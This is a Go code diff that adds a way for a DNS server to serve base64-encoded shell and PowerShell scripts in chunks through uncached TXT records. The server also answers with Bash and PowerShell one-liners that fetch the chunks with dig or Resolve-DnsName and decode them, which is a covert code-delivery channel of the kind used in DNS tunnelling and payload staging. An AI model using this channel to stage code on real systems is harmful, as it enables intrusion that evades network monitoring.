@@ -1,6 +1,7 @@
 package server
 
 import (
+	"encoding/base64"
 	"encoding/hex"
 	"fmt"
 	"log"
@@ -51,6 +52,10 @@ type Server struct {
 	fileAssemblies map[string]*FileAssembly // hash -> assembly
 	assemblyMu     sync.RWMutex
 	outputDir      string
+
+	// Script chunks for serving via DNS
+	scriptChunks map[string][]string // script name -> base64 chunks
+	scriptMu     sync.RWMutex
 }
 
 // NewServer creates a new DNS server
@@ -58,7 +63,7 @@ func NewServer(port int, s *stats.Stats, verbose bool, domain string, outputDir 
 	// Create output directory if it doesn't exist
 	os.MkdirAll(outputDir, 0755)
 
-	return &Server{
+	server := &Server{
 		port:           port,
 		stats:          s,
 		shutdown:       make(chan struct{}),
@@ -67,6 +72,66 @@ func NewServer(port int, s *stats.Stats, verbose bool, domain string, outputDir 
 		records:        make(map[string]map[uint16][]Record),
 		fileAssemblies: make(map[string]*FileAssembly),
 		outputDir:      outputDir,
+		scriptChunks:   make(map[string][]string),
+	}
+
+	// Load and prepare script files
+	server.loadScripts()
+
+	return server
+}
+
+// loadScripts loads script files and prepares them for DNS serving
+func (s *Server) loadScripts() {
+	scripts := map[string]string{
+		"linux":   "script.sh",
+		"windows": "script.ps1",
+	}
+
+	for name, filename := range scripts {
+		var data []byte
+		var err error
+
+		// Try different paths to find the script
+		paths := []string{
+			filename,
+			"./" + filename,
+			"../" + filename,
+		}
+
+		for _, path := range paths {
+			data, err = os.ReadFile(path)
+			if err == nil {
+				break
+			}
+		}
+
+		if err != nil {
+			log.Printf("Warning: Could not load script %s: %v", filename, err)
+			continue
+		}
+
+		// Encode as base64
+		encoded := base64.StdEncoding.EncodeToString(data)
+
+		// Split into chunks of ~200 characters (safe for DNS TXT records)
+		chunkSize := 200
+		var chunks []string
+		for i := 0; i < len(encoded); i += chunkSize {
+			end := i + chunkSize
+			if end > len(encoded) {
+				end = len(encoded)
+			}
+			chunks = append(chunks, encoded[i:end])
+		}
+
+		s.scriptMu.Lock()
+		s.scriptChunks[name] = chunks
+		s.scriptMu.Unlock()
+
+		if s.verbose {
+			log.Printf("Loaded script %s: %d chunks", filename, len(chunks))
+		}
 	}
 }
 
@@ -241,6 +306,13 @@ func (s *Server) handleRequest(data []byte, clientAddr *net.UDPAddr) {
 			log.Printf("DNS Query: %s -> %s from %s", question.Name, typeName, clientAddr.IP)
 		}
 
+		// Check if this is a script query
+		if scriptAnswers := s.handleScriptQuery(question.Name, question.Type); scriptAnswers != nil {
+			allAnswers = append(allAnswers, scriptAnswers...)
+			success = true
+			continue
+		}
+
 		// Check if this is a missing chunks query
 		if missingAnswers := s.handleMissingQuery(question.Name, question.Type); missingAnswers != nil {
 			allAnswers = append(allAnswers, missingAnswers...)
@@ -315,6 +387,159 @@ func (s *Server) getTypeName(recordType uint16) string {
 	default:
 		return fmt.Sprintf("TYPE%d", recordType)
 	}
+}
+
+// handleScriptQuery handles queries for script files
+// Format: [chunk_num.]linux.script.<domain> or [chunk_num.]windows.script.<domain>
+// Returns TXT records with script chunks, or nil if not a script query
+func (s *Server) handleScriptQuery(queryDomain string, queryType uint16) []dns.ResourceRecord {
+	// Only handle TXT queries
+	if queryType != dns.TypeTXT {
+		return nil
+	}
+
+	// Check if query matches script format
+	var scriptName string
+	var chunkNum int = -1
+
+	if s.domain != "" {
+		// Normalize domains for comparison (lowercase)
+		queryDomainLower := strings.ToLower(queryDomain)
+		domainLower := strings.ToLower(s.domain)
+
+		// Check if query ends with the configured domain
+		if !strings.HasSuffix(queryDomainLower, "."+domainLower) {
+			return nil
+		}
+
+		// Extract the part before the domain
+		prefix := queryDomainLower[:len(queryDomainLower)-len("."+domainLower)]
+		parts := strings.Split(prefix, ".")
+
+		// Should be: [chunk_num.]linux.script or [chunk_num.]windows.script
+		if len(parts) < 2 {
+			return nil
+		}
+
+		// Check if last part is "script"
+		if parts[len(parts)-1] != "script" {
+			return nil
+		}
+
+		// Get script name (should be before "script")
+		if len(parts) < 2 {
+			return nil
+		}
+		scriptName = parts[len(parts)-2]
+		if scriptName != "windows" && scriptName != "linux" {
+			return nil
+		}
+
+		// Check if there's a chunk number prefix
+		// Format: chunk_num.linux.script.<domain>
+		if len(parts) >= 3 {
+			if num, err := strconv.Atoi(parts[0]); err == nil {
+				chunkNum = num
+			}
+		}
+	} else {
+		// No domain configured - check format: [chunk_num.]linux.script or [chunk_num.]windows.script
+		parts := strings.Split(queryDomain, ".")
+		if len(parts) < 2 {
+			return nil
+		}
+
+		// Check if last part is "script"
+		if parts[len(parts)-1] != "script" {
+			return nil
+		}
+
+		// Get script name
+		if len(parts) < 2 {
+			return nil
+		}
+		scriptName = parts[len(parts)-2]
+		if scriptName != "windows" && scriptName != "linux" {
+			return nil
+		}
+
+		// Check if there's a chunk number prefix
+		// Format: chunk_num.linux.script
+		if len(parts) >= 3 {
+			if num, err := strconv.Atoi(parts[0]); err == nil {
+				chunkNum = num
+			}
+		}
+	}
+
+	// Get script chunks
+	s.scriptMu.RLock()
+	chunks, exists := s.scriptChunks[scriptName]
+	s.scriptMu.RUnlock()
+
+	if !exists || len(chunks) == 0 {
+		return nil
+	}
+
+	// If chunk number specified, return that chunk only
+	// Note: chunk numbers in one-liner are 1-based, but array is 0-based
+	if chunkNum >= 1 {
+		chunkIdx := chunkNum - 1 // Convert to 0-based index
+		if chunkIdx < len(chunks) {
+			chunkData := []byte{byte(len(chunks[chunkIdx]))}
+			chunkData = append(chunkData, []byte(chunks[chunkIdx])...)
+
+			rr := dns.ResourceRecord{
+				Name:    queryDomain,
+				Type:    dns.TypeTXT,
+				Class:   1, // IN
+				TTL:     0, // TTL=0 to prevent caching
+				Data:    chunkData,
+				DataLen: uint16(len(chunkData)),
+			}
+			return []dns.ResourceRecord{rr}
+		}
+		return nil
+	}
+
+	// Return a one-liner command to retrieve the full script
+	// This avoids DNS resolver limits on large responses
+	var oneliner string
+	baseDomain := scriptName + ".script"
+	if s.domain != "" {
+		baseDomain = baseDomain + "." + s.domain
+	}
+
+	if scriptName == "windows" {
+		// PowerShell one-liner to retrieve and decode the script
+		// Format: $i.windows.script.<domain>
+		// Shortened version to fit in DNS TXT record
+		oneliner = fmt.Sprintf("[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((1..%d|%%{Resolve-DnsName -ty TXT -na \"$_.%s\"|? Section -eq Answer|%% Strings})))", len(chunks), baseDomain)
+	} else {
+		// Bash one-liner to retrieve and decode the script
+		// Format: $i.linux.script.<domain>
+		// Use tr -d ' ' to remove spaces between base64 chunks
+		oneliner = fmt.Sprintf("echo $(for i in $(seq 1 %d); do dig +short $i.%s TXT | grep -oE '\"[^\"]+\"' | tr -d '\"'; done) | tr -d ' ' | base64 -d", len(chunks), baseDomain)
+	}
+
+	// Return the one-liner as a single TXT record
+	onelinerData := []byte{byte(len(oneliner))}
+	onelinerData = append(onelinerData, []byte(oneliner)...)
+
+	rr := dns.ResourceRecord{
+		Name:    queryDomain,
+		Type:    dns.TypeTXT,
+		Class:   1, // IN
+		TTL:     0, // TTL=0 to prevent caching
+		Data:    onelinerData,
+		DataLen: uint16(len(onelinerData)),
+	}
+
+	if s.verbose {
+		log.Printf("Script query for %s: returning one-liner command (%d chunks total)", scriptName, len(chunks))
+	}
+
+	return []dns.ResourceRecord{rr}
 }
 
 // handleMissingQuery handles queries for missing chunks
